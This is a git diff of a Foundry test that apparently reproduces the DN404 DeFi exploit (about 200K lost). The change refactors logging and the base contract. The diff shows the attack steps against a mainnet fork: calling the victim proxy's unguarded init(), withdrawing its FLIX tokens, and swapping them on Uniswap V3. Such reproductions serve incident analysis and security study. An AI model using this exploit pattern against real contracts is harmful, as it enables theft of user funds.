@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.15;
 
-import "forge-std/Test.sol";
+import "../basetest.sol"
 import "../interface.sol";
 
 // @KeyInfo - Total Lost : 200K
@@ -32,7 +32,7 @@ interface IProxy {
     ) external;
 }
 
-contract DN404 is Test {
+contract DN404 is BaseTestWithBalanceLog {
     uint256 constant blockNumber = 19_196_685;
     address constant victim = 0x2c7112245Fc4af701EBf90399264a7e89205Dad4;
     address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
@@ -47,12 +47,10 @@ contract DN404 is Test {
         vm.label(USDT, "USDT");
         vm.label(UniV3Pair, "Uniswap V3 Pair");
         vm.createSelectFork("mainnet", blockNumber);
+        fundingToken = USDT;
     }
 
-    function testExploit() public {
-        // Implement exploit code here
-        emit log_named_decimal_uint(" Attacker USDT Balance Before exploit", IERC20(USDT).balanceOf(address(this)), 6);
-        
+    function testExploit() public balanceLog {        
         uint256 initPeriods = 1;
         uint256 initInterval = 1_000_000_000_000_000_000;
         uint256 amount = IERC20(FLIX).balanceOf(address(victim));
@@ -60,8 +58,6 @@ contract DN404 is Test {
         IProxy(victim).init(IERC20(WETH), initPeriods, initInterval);
         IProxy(victim).withdraw(IERC20(FLIX), amount, address(this));
         Uni_Pair_V3(UniV3Pair).swap(address(this), true, 685_000_000_000_000_000_000_000, 4_295_128_740, "");
-        // Log balances after exploit
-        emit log_named_decimal_uint(" Attacker USDT Balance After exploit", IERC20(USDT).balanceOf(address(this)), 6);
     }
 
       function uniswapV3SwapCallback(
